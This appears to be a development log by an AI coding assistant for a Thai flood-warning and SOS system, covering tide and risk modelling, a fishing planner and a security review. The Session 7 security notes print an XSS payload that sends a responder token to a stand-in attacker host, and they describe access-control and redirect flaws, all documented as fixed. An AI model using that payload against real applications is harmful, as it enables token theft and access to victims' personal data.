**Done, 162 tests passing.**
- `astro.py`, sun/moon position, rise, set, transit, civil twilight. Events found
  **numerically** (scan altitude, bisect crossings) rather than by closed-form hour
  angle: one code path for both bodies, degrades gracefully where a body never rises.
- `fishing.py`, solunar windows, transparent bite scoring, clarity advice.
- `adapters/spots.py`, 40 spots: the 23 verified tide points plus 17 inland reservoirs
  and river reaches. Weather (pressure + wind) fetched in one batched call.
- `fishing.json` published (1.09 MB → **42 KB gzipped**, separate file so it never
  weighs on the flood map). `web/fish.html` with an hourly chart, tide curve, table view.

**Astronomy validated, not assumed**
- **Solar against Open-Meteo's own sunrise/sunset**, 5 locations × 7 days: agreement
  within **37 s worst case, 17 s mean** (they floor to the minute). Fixtures captured so
  the test runs offline.
- **Lunar against physical invariants**, no ephemeris to hand, so the sky is the oracle:
  transit drifts **47.7 min/day**, transit↔antitransit **12.4 h**, and at full moon
  **moonrise falls within 0.4 h of sunset**. All three hold.
- My first validation harness reported a 1,441-minute error. That was the *harness*
  mislabelling days, Open-Meteo files Bangkok's 23:06 UTC sunrise under the next local
  day. Re-matched by nearest event instead of by index.

**A data misreading caught before it shipped**
I was about to build reservoir mode on ThaiWater's `storage_percent`. Verified across
**794 stations, 100% agreement**, it is actually
`(level − ground) / (bank − ground)`, the fraction of CHANNEL depth filled. **115% means
15% ABOVE BANK, i.e. flooding**, not a full reservoir. Reading it the other way would
have been wrong in the most dangerous possible direction. Every station is
`tele_waterlevel`; there is no dam dataset here. Reservoir drawdown is therefore
explicitly NOT modelled, and `fishing.json` says so in its `caveat`.

**A fairness bug I wrote, then caught**
My own comment said tideless water must have the tide weight redistributed "otherwise
every inland spot would look worse than every coastal one for no real reason", and I
then applied it only to reservoirs, leaving non-tidal rivers forfeiting 21 points they
could never earn. The scale was measuring "is it near the sea", not "is it worth going".
Fixed with `effective_weights(profile, has_tide)`. Inland mean peak went 37-40 → 48;
the bottom of the ranking is now small-tidal-range Gulf spots (Pattani 0.47 m swing),
which is physically correct.

**Chart design**, loaded the `dataviz` skill first. It changed two decisions: a
value-ramp across bars would double-encode height as hue and burn the free colour
channel (now one series colour with emphasis on the best hours), and the tide curve is a
**separate chart**, never a second y-axis. Could not run the palette validator (node
script, no node here), acceptable only because this uses the reference palette's slot-1
blue unchanged with a single series, so there is no new palette to validate. Geometry
verified numerically across **2,880 bars**: no overflow, no label collisions.

**Design notes**
- Bite score weights the **rate** of tidal change, not height, slack water at high tide
  is the worst moment of the cycle and the one a height-based score would rate best.
- Turbidity is **tactics, not score**: muddy water changes how you fish, not whether.
- Every scored hour carries its factors; 0 hours score above zero without an explanation.

---

## 2026-09-15, Session 7: Phase 6 (hardening, security, load, degraded mode)

**Done, 132 tests passing. Six security findings, all fixed.** See `docs/SECURITY.md`
and `docs/OPERATIONS.md`.

**Security review, the critical one**
`note` and `contact_name` come from the PUBLIC unauthenticated submit endpoint and were
rendered into the ops console with `innerHTML`. A submission containing
`<img src=x onerror="fetch('//attacker/?t='+localStorage.seraphim_token)">` runs in every
responder's browser and steals the token that unlocks the name, phone, precise location
and medical needs of everyone who asked for help. **Anonymous attacker → full access to
the most sensitive data in the system, via the one endpoint that must stay public.**
Fixed with an `esc()` escaper on every interpolation across all three pages, plus a CSP
in `web/_headers`.

Also fixed: province-scope bypass (scope was enforced in `list()` but not `detail()` or
`update()`, so a district volunteer could read any request in the country by id, now
404, not 403, so existence cannot be probed); a deployable placeholder `IP_SALT` that
would have made every stored IP hash reversible (now fails closed); and `sos.html`
accepting `?api=` from the URL, so a shared link could redirect a victim's name, phone,
location and health data to an attacker.

**Load test found a security control causing the harm it prevents**
Per-IP rate limiting of 12/10 min. Thai mobile networks use carrier-grade NAT, so
thousands of subscribers share one address: modelling 1,000 users behind one carrier NAT,
**988 legitimate requests rejected**, and mobile-only users are disproportionately those
with no landline to call 1784 from. Replaced with two buckets: **device** (8/10 min, the
real actor) and **IP** (300, or 900 when the report is life-threatening). Verified 400
distinct devices behind one NAT reporting `medical` all get through; one device spamming
stops at 8. 429s are queued and retried client-side, so a rate limit delays rather than
loses. *A false accept costs one triage review; a false reject can cost a life.*

**Capacity, the honest headline**
Read path is fine at any scale (311 GB CDN egress on unmetered Pages; static files never
reach an origin). **The write path is not: a national 2011-scale event needs ~204,000
Worker requests against a 100,000/day free tier.** Provincial and regional events fit.
**The fix is $5/month** (Workers Paid, 10M/month) and changes nothing architecturally.
Budget it before flood season, not during one.

**A bug my own fix introduced, caught by its own test**
Capping forecast escalation at level 4 (so level 5 means "water is over the bank now", an
observed fact, rather than a forecast wearing the same badge), I wrote `min(4, level+1)`,
which **demoted genuinely over-bank stations from 5 to 4**: a cap meant to prevent
overstatement instead understated flooding rivers. Live level-5 count fell 305 → 273
before the test caught it. Rewritten as a guarded increment; regression test added.
Verified on live data: the level-5 set is now exactly the at-or-over-bank set.

**Time-to-bank is live.** The archive accumulated enough history during this session:
**47 stations** now carry a real time-to-bank, soonest **3.1 h** (ลำเซบาย, ยโสธร; also
บางตะบูน, เพชรบุรี rising 31 cm/hr). Trend confidence is `fair` for 298 stations, spans
are still ~1 h, so nothing reaches `good` (needs ≥2 h span and R²≥0.7) until the cron has
been running longer.

**Degraded mode**, service worker now caches snapshots, so an origin failure degrades to
last-known data behind an amber "may be out of date" banner rather than a blank page. Ops
console states plainly when the API is unreachable instead of leaving stale requests
looking current. No cached snapshot at all → a clear message pointing at 1784 / 191.

**Observability**, `meta.json` now carries a `health` block with an explicit
pass/warn/fail verdict and per-check detail, so a monitor reads one field. Thresholds in
`docs/OPERATIONS.md`. Guards the quiet failure: pipeline running, map rendering, data
hours out of date.

**Payload**, reasons are published only for risk level ≥ 2 (at level 1 they are
boilerplate). Snapshot 1.42 MB → 1.25 MB raw, 134 KB → 130 KB gzipped; ~190 KB per first
visit including the app shell.

**Still open:** SMS/USSD intake (needs a telco agreement; `source` already accepts
`'sms'`). The Worker has still never been executed, no node here.

---

## 2026-09-15, Session 6: Phase 4 built (SOS emergency coordination)

**Done, Phase 4 code complete, 117 tests passing.** Verified end-to-end over real HTTP.
- `api/schema.sql`, D1/SQLite schema. PDPA-shaped: recorded consent, per-row
  `purge_after`, `access_log`, hashed tokens, hashed IPs.
- `api/src/index.js`, Cloudflare Worker. Submit / triage / detail / update / clusters /
  anonymised public summary / nightly purge cron.
- `workers/seraphim/sos.py`, domain rules (20 need codes, severity, geohash, clustering).
- `workers/seraphim/devserver.py`, **Python dev server implementing the same contract**,
  so the front end is testable without node or wrangler. Runs the real `schema.sql`.
- `web/sos.html`, citizen form, offline-first (IndexedDB queue + service worker).
- `web/ops.html`, responder triage console: queue, map, clusters, lifecycle, audit.

**The two-implementation problem, and how it is contained**
Production is a JS Worker; there is no node on this machine, so it cannot be executed
here. Rather than pretend otherwise: `api/conformance/severity.json` holds hand-reasoned
cases that BOTH implementations are tested against, plus tests that diff the need codes
and thresholds straight out of the JS source. If they ever disagree, the conformance file
is the referee. D1 *is* SQLite, so the dev server exercises the production schema.

**Bug found by the conformance suite**
My geohash sent a point sitting exactly on a cell midpoint to the LOW cell, so (0,0)
encoded as `7zzzz` instead of the standard `s0000`. Only matters on exact boundaries -
but 0/0 is precisely what a broken GPS reports. Fixed to `>=`, matching Redis /
Elasticsearch / geohash.org. The canonical example (`u4pruydqqvj`) still passes.

**Bug found in my own dev server**
The responder token was printed but never appeared: Python block-buffers stdout when
backgrounded, so you could start the server and have no way to sign in. Fixed with
`flush=True` plus a `--token-file` option.

**Design decisions that matter**
- **Offline is the default assumption.** Submissions queue in IndexedDB and retry; a
  client-generated `client_id` makes retries idempotent, so one family cannot become
  twelve pins and twelve boats. Enforced by a partial unique index in the schema.
- **Waiting escalates severity** at read time (+1 at 6 h, +2 at 12 h), so the queue
  reorders itself and nobody is forgotten in arrival order.
- **Clusters are dispatch hints, never merges**, the underlying requests stay open.
- **`access_log` outlives the data it describes**: it is the evidence that access was
  controlled, so it survives the purge.
- **Consent is mandatory**; submission is refused without it.
- **Trust tiers** (volunteer → official → admin) with optional province scope, so a
  district responder cannot read the whole country.
- `tel:1784` / `tel:191` are the largest, first elements on the citizen form, if
  someone is in danger, calling beats filling in a form.

**Verified end-to-end over HTTP:** submit → offline retry collapses to one → consent
refused → unauthenticated read blocked → responder queue sorted worst-first → clusters
(3 requests in one geohash in บางพลี) → assign → resolve → audit trail intact → public
summary leaks no PII.

**Explicitly NOT built (and why)**
- **SMS/USSD intake**, needs a Thai telco or Twilio agreement. `source` already accepts
  `'sms'`, so it slots in without a schema change.
- **`.go.th` magic-link sign-in**, needs an email provider. Manual allowlist works today.
- **Load testing**, Phase 6.

---

## 2026-09-15, Session 5: Phase 2 built (risk engine)

**Done, Phase 2 code complete, 75 tests passing.**
- `history.py`, archive replay, duplicate collapsing, **least-squares** rate of rise with
  R²-based confidence (`good`/`fair`/`poor`/`none`).
- `risk.py`, explainable 1-5 scoring, **time-to-bank**, tide compounding, district rollup.
  Every score carries bilingual `reasons`; **1,121/1,121 stations carry reasoning**.
- `areas.json`, 479 districts, all **77/77 provinces**, ranked worst-first. Verified
  `(province_code, district_code)` is collision-free on real data.
- Map: risk mode (now default), a "เหตุผล · WHY" panel in every popup, prominent
  time-to-bank, and a clickable highest-risk-districts list.

**Why `waterlevel_msl_previous` is still not used (re-tested, decision confirmed)**
Measured it against our archive: 481 stations matched a prior archived level, but the gaps
clustered at **10 / 20 / 30 / 60 min with no single interval**, and most "matches" were flat
readings that prove nothing. A rate from an assumed Δt would be wrong by up to **6×**.
→ Rate comes only from our own timestamped archive. Regression (not two-point differencing)
because intervals are irregular and telemetry is noisy, two-point would turn one spurious
reading into a dramatic false alarm.

**ThaiWater has no usable public history endpoint.** `public/waterlevel_graph` accepts
`station_id` but returns a **Go panic** (index out of range). Stopped probing rather than
hammer a government API. Bootstrapping history is therefore not possible; the archive must
accumulate. Recorded in `docs/DATA_SOURCES.md`.

**Validation**
- Regression recovers a synthetic 0.10 m/hr exactly (R²=1.0) and 0.1057 under ±3 cm noise.
- Full replay through a real on-disk archive: 315 real stations given a synthetic 6 h history →
  **189 with time-to-bank**, arithmetic exact (0.24 m ÷ 0.30 m/hr = 0.8 h).
- Tide compounding fires correctly on live data at **Phra Pradaeng, Samut Prakan** (20 km from
  Chao Phraya mouth) and, in replay, **Bang Nam Priao, Chachoengsao** (51 km from Bang Pakong)
 , both genuinely tidal, flood-prone delta districts.
- Guards tested: TTB withheld on weak trends, on noise-level rates, when falling, when already
  over bank, and beyond a 72 h horizon.

**Live output right now:** risk 5=306, 4=2, 3=41, 2=194, 1=578 · **0 with time-to-bank**,
because the archive spans ~30 min (below the 45 min minimum span). Correct behaviour, and it
resolves itself once the cron runs.

**Two test bugs I introduced and fixed**
- A test helper hardcoded `district_code="01"`, collapsing two districts into one bucket.
  Prompted a real-data check: **no (province, district) collisions across 479 districts**.
- A `merge_current` assertion expected 1 reading where 2 is correct.

**Deliberate design choices**
- A stale gauge **keeps** its risk level (a silent gauge over bank is more alarming, not less)
  but drops to `confidence: poor` with an explicit reason.
- District rollup takes the **worst** station, never an average: one overtopping river is not
  cancelled out by three calm ones nearby.
- A high tide alone never raises a calm river, it only compounds already-elevated risk.

---

## 2026-09-15, Session 4: Phase 1 built (forecast + tide layer)

**Done, Phase 1 code complete, verified against live data. 45 tests passing.**
- **Open-Meteo adapters** (`adapters/openmeteo.py`): `RainAdapter` (hourly precipitation,
  past 24 h + next 72 h) and `DischargeAdapter` (GloFAS 7-day river discharge).
  New `ForecastAdapter` interface, these *enrich* existing stations rather than create them,
  so it is deliberately separate from `SourceAdapter`.
- **Tide** (`adapters/marine.py` + `tide.py`): 23 curated Thai coastal points, extreme
  detection, tide state/rate, empirical range classification, lunar phase, and
  `coincidence_window` (high tide ∩ discharge = backwater risk, ready for Phase 2).
- **Map**: 3 view modes (level / rain 24 h / discharge trend), tide layer with next 5
  high-low times, enriched popups. Defaults to opening Chao Phraya mouth.
- **Per-source caching** (`cache.py`) + `actions/cache` in CI.

**Coverage:** rain 1,121/1,121 · discharge trend 1,087/1,121 · tide 23/23.
Snapshot 878 KB → 106 KB gzipped; tide.json 75 KB → 19 KB.
**Cold build 50 s, warm build 6 s**, the 30-min cron hits the warm path almost always.

**The quota problem, and the fix**
Naively refetching forecasts on the 30-min level cadence = ~100,000 Open-Meteo
location-calls/day against a **10,000/day** free allowance. Two-part fix:
1. **Batching**, verified the API takes 150 coordinates per request and returns them
   **in request order**. We use 100. Order is the ONLY link between a result and a station,
   so a length mismatch **drops the batch** rather than risk pairing the wrong forecast to
   the wrong river.
2. **Per-adapter refresh interval**, each adapter declares `refresh_hours` because its data
   goes stale at its own rate: rain 6 h (weather models), GloFAS 24 h (daily product),
   tide 24 h (harmonic). Total ≈ **5,600 calls/day**, comfortably inside the allowance,
   while keeping the time-sensitive input fresh.

**Physics finding that changed the design**
Validated lunar spring/neap against 25 days of real tide at Chao Phraya mouth. It **failed**:
"spring" days averaged 2.17 m vs "neap" 1.99 m, only 9%, and two days within 4 days of the
same new moon ranged 2.48 m and 1.81 m. Cause is real, not a bug: **the upper Gulf of Thailand
is a mixed, mainly-diurnal tide**, modulated by lunar *declination*, not phase. Shipping a
"spring tide" badge would have been confidently wrong.
→ Range is now classified **empirically** against each location's own recent distribution
(`range_regime`). Works in any tidal regime, so it also scales globally. Moon phase is kept
only for solunar fishing (Phase 3), where it genuinely applies. Documented in `tide.py`
and `docs/DATA_SOURCES.md`.

**Other things verified rather than assumed**
- Marine model resolves **sea cells only**, inland coords return an empty series (confirmed
  at Ayutthaya). Hence 23 curated coastal points, each individually probed: **23/23 usable**.
- Regional tide physics confirms itself: upper Gulf river mouths ~2.3 m (why Bangkok gets
  backwater flooding), southern Gulf 0.47-0.63 m, Andaman 1.7-2.6 m.
- Parabolic refinement of hourly samples recovers **sub-hourly** extreme timing
  ("high 18:26", not "high 18:00"), tested against a synthetic curve with a known answer.
- GloFAS returns no river at 12-34 gauges, expected for canals/gates below the ~5 km model.
  Left `null`, never 0.

**Next (Phase 2, risk engine)**
- Rate of rise from **our own archive** (the interval is known there, unlike
  `waterlevel_msl_previous`) → **time-to-bank**, the headline number.
- Tide compounding via `coincidence_window`, already written and tested.
- Do NOT depend on `situation_level`: null for 302 of 306 overtopped stations (Session 3).

---

## 2026-09-15, Session 3: Phase 0 built

**Done, Phase 0 is code complete and verified against live data.**
- **AGPL-3.0** chosen and `LICENSE` added. Repo to be **private for now**.
- **Cadence corrected for private repos.** GitHub Free gives private repos 2,000 Actions
  min/month, jobs rounded UP to whole minutes. `*/15` = ~2,880 min/mo -> **over budget**.
  Set cron to **`*/30`** (~1,440 min/mo). One-line change to `*/15` or `*/10` when public
  (public repos = unlimited). Documented at the top of `ingest.yml`.
- **Zero third-party dependencies.** Python stdlib only (no node/npm/pip on this machine
  anyway). No install step, fast CI, no supply chain.
- Built: `models.py` (canonical types + datum contract), `adapters/base.py` (`SourceAdapter`
  + null-safe parsers), `adapters/thaiwater.py`, `publish.py`, `cli.py`, 20 unittest tests,
  `ingest.yml`, `keepalive.yml`, static MapLibre map, README.
- **Live verified:** 1,121/1,121 stations parsed. 680 KB -> 79 KB gzipped (8.6x).
  306 at/over bank, 355 stale, median reading age ~64 min. Map + data paths serve over HTTP 200.

**Bugs found and fixed while building**
1. **All 1,121 stations were silently dropped.** ThaiWater sends station ids as *ints*;
   the `text()` helper only accepted `str`, so every row failed the id gate and the build
   published an empty map. Fixed by adding an explicit `ident()` parser. Lesson: the id
   gate needed its own test, and now has one.
2. **Wrong id field.** `row.id` changes every reading (it identifies the *observation*);
   `station.id` is the stable gauge key. Using `row.id` would have created ~1,121 brand-new
   "stations" every 30 minutes and destroyed any history. Now uses `station.id`.

**Validated, not assumed**
- 306 stations at/over bank looked alarmingly high (27%), so it was checked rather than
  shipped: the source's own `diff_wl_bank_text` flags exactly the same set as `ล้นตลิ่ง`
  (overflowing). **Sign agreement 1,121/1,121.** September is peak monsoon, the number is real.
- The sign cross-check is now permanent in the adapter and warns on any disagreement, because
  inverting freeboard would turn "overtopped" into "safe", the worst failure this system could have.
- **`situation_level` is null for 302 of the 306 overtopped stations.** The source's own
  severity field is unreliable exactly when it matters most, so our computed freeboard is the
  better signal. Do not depend on `situation_level` in Phase 2.

**Deliberately NOT done (and why)**
- **No rate-of-rise / time-to-bank yet.** `waterlevel_msl_previous` exists, but the interval
  between it and the current reading is undocumented. A rate over an assumed delta-t would be a
  guess presented as a measurement. Phase 2 computes it from *our own* archived history, where
  the interval is known. Recorded in `models.py`.
- **Snapshots are not committed to git**, ~600 KB x 48/day is ~10 GB/year. `data/` is gitignored;
  output goes to R2. `keepalive.yml` exists because a repo that never commits would have its
  scheduled workflows silently disabled after 60 days.

---

## 2026-09-15, Session 2: naming, move, free-tier re-architecture

**Done**
- Renamed project **NAMFAO → SeRAPHIM**
  (*System for early Real-time Assessment & Predictive Hazard Incident Monitoring*).
  All files moved to `/home/khunanon/Mini_Project/Project_SeRAPHIM`, git re-init'd at that root
  (it is the future GitHub repo root). Skill dir renamed to `.claude/skills/seraphim/`.
  Verified zero stale `namfao` references.
- Re-architected for **free hosting + open source**. Verified free-tier limits live:
  - GitHub Actions: **unlimited minutes on public repos**; scheduled workflows auto-disable
    after 60 days of repo inactivity (known silent-failure mode → needs heartbeat)
  - Cloudflare: Workers 100k req/day + 10 ms CPU · **D1 500 MB** (not 5 GB, corrected) ·
    R2 10 GB with **$0 egress** · Pages bandwidth effectively unlimited
- **Key structural decision: no runtime database on the monitoring/prediction path.**
  Actions cron → compute → static snapshot JSON + PMTiles → Cloudflare CDN. A million map views
  cost $0 and touch no origin. Also the most disaster-resilient shape available.
  Corollary: the site MUST stay statically pre-rendered, or page views burn the Worker cap.
- Chose **Cloudflare over Vercel**, Vercel Hobby forbids commercial use, which would cap the
  project's future; Cloudflare free has no such restriction and unlimited bandwidth.
- Added SOS **trust tiers** (public → verified volunteer → verified official) so the system is
  useful with zero verified officials on day one.
- Proposed official-verification ladder: `.go.th` magic link + manual allowlist → invite tree →
  agency SSO. Recorded in PLAN §9.

**Decided**
- Name: SeRAPHIM · Hosting: free tier, open source · no PostGIS/Timescale at runtime
  (spatial work runs offline in Actions, ships as static geometry)

**Open questions for user**
- Open-source licence: AGPL-3.0 (keeps hosted forks open) vs MIT (max adoption)
- Cloudflare + GitHub accounts needed at Phase 0 start

---

## 2026-09-15, Session 1: research & planning

**Done**
- Confirmed empty project dir; `git init`. Python 3.14.7 available; no node/docker detected yet.
- Researched and **live-tested** data sources (results in `docs/DATA_SOURCES.md`):
  - ✅ ThaiWater `api-v3.thaiwater.net/api/v1/thaiwater30/public/waterlevel`, **1,121 live
    stations**, keyless. Has `waterlevel_msl`, `waterlevel_msl_previous`, `min_bank`,
    `critical_level_msl`, `diff_wl_bank`, `situation_level`, lat/lon, basin, tambon geocode.
    This is enough for a real early-warning engine.
  - ✅ ThaiWater `/public/rain_24h`, 24h rainfall by station
  - ✅ Open-Meteo Flood (GloFAS river discharge), Forecast (precip), Marine
    (`sea_level_height_msl` = tide; verified 2.29 m swing in Gulf of Thailand)
  - ✅ GDACS global events, USGS earthquakes
  - ❌ TMD `data.tmd.go.th`, HTTP 000 + robots.txt disallows → needs official API key
  - ❓ GISTDA portal up (200) but endpoints unprobed
  - ❓ No clean public CCTV feed found yet
- Key insight: global backbone (Open-Meteo + GDACS) is keyless and worldwide → **global scaling
  is half-solved from day one**; national networks are upgrades behind a `SourceAdapter`.
- Asked user 4 scoping questions. Answers: real product · map first · SOS full-but-unofficial ·
  stack my choice.
- Wrote `docs/PLAN.md`, `docs/DATA_SOURCES.md`, `CLAUDE.md`, `.claude/skills/seraphim/SKILL.md`.

**Decided**
- Stack: Next.js 15 + TS + MapLibre GL + Postgres/PostGIS/TimescaleDB + Python workers, pnpm monorepo
- Headline feature = **time-to-bank** (hours until overtopping), with explainable reasoning
- Tide compounding (spring high tide ∩ discharge peak) is the Bangkok-specific insight
- Calm-mode fishing planner is a retention strategy, not a toy, installed on quiet days = trusted on bad days

**Open questions raised (all since resolved, see Session 2)**
- Final product name · hosting + budget · verifying real officials
